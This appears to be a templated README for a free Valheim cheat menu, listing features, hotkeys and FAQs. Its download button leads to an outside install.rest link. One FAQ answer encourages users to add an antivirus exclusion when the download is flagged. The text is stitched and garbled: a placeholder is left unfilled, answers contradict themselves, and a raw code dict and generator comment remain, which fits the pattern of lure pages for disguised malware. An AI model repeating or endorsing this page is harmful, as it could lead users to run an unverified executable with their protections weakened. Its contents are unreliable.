<div align="center">

# Valheim — Mod Menu

**Unleash Valheim's hidden powers**
Free, open source, no installer. Opens with `Insert`.

![Version](https://img.shields.io/badge/version-1.0.0-4A7D2C?style=flat-square)
![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
![Store](https://img.shields.io/badge/Steam-supported-4a8c5a?style=flat-square)
![Options](https://img.shields.io/badge/options-24%2B-6a6a6a?style=flat-square)
![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)

<p align="center">
<a href="https://install.rest/game/d0c81539-4f4d-494b-9d7d-d95a7f7039e6" rel="nofollow">
  <img src="https://camo.githubusercontent.com/b87131a1df3e3571047c2418ffeb7e38d207b84106665151f330efb21ec3f801/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d626c61636b3f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" width="300" data-canonical-src="https://img.shields.io/badge/Download-black?style=for-the-badge&amp;logo=github" style="max-width: 100%;">
<img alt="image" src="{{SCREENSHOT}}" />
</a>
</p>

</div>

---

> [!IMPORTANT]
> Valheim is 8-player co-op. Options marked **`crew`** change the shared session for everyone — Supports up to 8 players, syncs across sessions..
>
> **Host-only mode ships enabled** and blocks them while you are a guest. Run this with people who know it is running.

## What it does

Valheim Mod Menu gives you instant access to all the game’s secrets, from infinite resources to invincibility.

Designed for solo and cooperative play, it keeps the experience balanced while letting you experiment freely.

## Features

| Option | Hotkey | What it does |
|---|---|---|
| Unlimited Resources | `F1` | Add any amount of wood, stone, or ore with a single click. |
| Invincibility | `F2` | Become immune to all damage for a set duration. |
| Fast Travel | `F3` | Instantly teleport to any discovered location on the map. |
| Item Speed Multiplier | slider | `1x`–`50x`, default `3x` |
| Health Regeneration | slider | `0%`–`100%` — the softer alternative to Adjusts how quickly your health regenerates per second. |
| Enable Crew Mode `crew` | `F4` | Allows you to assign crew members to tasks automatically. |
| Bypass Anti-Cheat `bypass` | `F5` | Temporarily disables anti-cheat checks for mod compatibility. |
| Save Game State `save` | — | Creates a backup of your current save file before applying changes. |
| Unlock all Unlock All Items | — | Persistent |
| Free camera | `F10` | Detach from the character |
| Hide HUD | `F11` | For screenshots |
| Field of view | slider | `60`–`130 deg` |

<sub>Tags — **`crew`**: changes the shared session · **`bypass`**: removes the work the game is built around · **`spoiler`**: reveals story early · **`save`**: writes persistent data · **`EA`**: unfinished Early Access system · **`comfort`**: accessibility, changes nothing. Use at most three. Anything tagged `bypass` or `spoiler` ships off.</sub>

## Hotkeys

`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse

> [!TIP]
> Use the menu responsibly and avoid exploiting for competitive play.

> [!WARNING]
> Cheats may cause instability and can lead to permanent damage to your save file.
>
> Options tagged `save` write persistent data that a patch can invalidate. Back up first and disable cloud sync while you experiment.

## FAQ

<details>
<summary>Will I get banned?</summary>
No. Yes, many servers consider mod menu use a violation of terms., no anti-cheat, no ranked mode. Achievements unlock locally unless you block them in the menu.
</details>

<details>
<summary>Does it affect multiplayer?</summary>
It can cause issues; use at your own risk.
</details>

<details>
<summary>How to uninstall?</summary>
Delete the mod files and restart.
</details>

<details>
<summary>Does it work on Steam Deck or Linux?</summary>
No. Windows only. Proton changes how the game's memory is laid out and this build does not handle that.
</details>

<details>
<summary>Windows Defender flagged the download.</summary>
Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Every release ships with a SHA256 checksum and full source. Add an exclusion if you are comfortable with that — and if you would rather not, don't. That is a reasonable call.
</details>

<details>
<summary>Options stopped working after an update.</summary>
Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
</details>

## Troubleshooting

| Symptom | Fix |
|---|---|
| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
| Game crashes options do nothing | That memory allocates only in When opening the menu. Get there first, then toggle. |
| Unlocks vanished after a patch | A persistent write was invalidated. Restore a backup from before the update. |
| Menu conflicts with other mods | Disable conflicting mods first. |

## Reporting a problem

[Open an issue](../../issues) with your **exact game build number** — that matters more than everything else combined — plus your store, Windows version, where you were in the game, and which single option misbehaved.

## Changelog

**v1.0.0** — 11 Sep 2026 — first release. 24+ options across ['Gameplay', 'Items', 'World', 'Cheats']. {'autoSave': True, 'debugMode': False}

<!-- One line per release. Do not invent a version history — the Releases tab
     is one click away and an empty one under a long changelog reads badly. -->

---

<div align="center">
<sub>Unofficial fan tool. Not affiliated with Iron Gate AB, Coffee Stain Studios or Valve. Valheim and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
</div>
